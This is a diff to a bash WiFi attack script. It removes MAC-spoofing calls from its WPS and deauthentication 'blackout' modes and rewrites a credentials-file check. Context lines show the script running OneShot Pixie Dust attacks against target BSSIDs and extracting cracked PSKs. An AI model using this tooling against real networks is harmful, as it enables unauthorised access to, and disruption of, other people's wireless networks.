@@ -263,6 +263,7 @@ set_mmode(){
 }
 
 iface_macchanger(){
+    banner
     iface=$1
     printf "\n\e[0m[\e[93m*\e[0m] Changing MAC address on \e[92m$iface\e[0m... \n"
     ip link set $iface down
@@ -274,12 +275,6 @@ iface_macchanger(){
 wps_blackout(){
     banner
     chk_iface $first_iface
-
-    if [ $mac_changer == 1 ];
-    then
-        iface_macchanger $second_iface
-    fi
-
     printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"
     printf "\n\e[0m[\e[93m*\e[0m] Scanning for WPS networks using config below:\n"
 
@@ -287,7 +282,6 @@ wps_blackout(){
 <------Config------>
 interface: \e[92m$first_iface\e[0m
 automode: \e[92m$automode\e[0m
-mac_changer: \e[92m$mac_changer\e[0m
 scan_accuracy: \e[92m$scan_accuracy\e[0m
 <------------------>
 "
@@ -366,9 +360,9 @@ scan_accuracy: \e[92m$scan_accuracy\e[0m
         
         python3 $(pwd)/config/OneShot/oneshot.py -i $first_iface -b ${target_bssid[$y]} -K -F -w
 
-        if [ ! -f "$creds_path" ];
+        if [ ! -e $creds_path ];
         then
-            printf "\n\e[0m[\e[91m!\e[0m] Not found \n"
+            printf "\n\e[0m[\e[91m!\e[0m] stored.txt not generated yet, or $creds_path is invaild! \n"
         else
             psk=$(cat $creds_path | awk '/BSSID: '${target_bssid[$y]}'/ {p = 4} p > 0 {print $0; p--}')
             if printf $psk | grep -q "BSSID";
@@ -406,12 +400,6 @@ scan_accuracy: \e[92m$scan_accuracy\e[0m
 deauth_blackout(){
     banner
     chk_iface $second_iface
-
-    if [ $mac_changer == 1 ];
-    then
-        iface_macchanger $second_iface
-    fi
-
     set_managed $second_iface
     printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"
     printf "\n\e[0m[\e[93m*\e[0m] Scanning for WiFi networks using config below:\n"
@@ -420,7 +408,6 @@ deauth_blackout(){
 <------Config------>
 interface: \e[92m$second_iface\e[0m
 automode: \e[92m$automode\e[0m
-mac_changer: \e[92m$mac_changer\e[0m
 scan_accuracy: \e[92m$scan_accuracy\e[0m
 <------------------>
 "
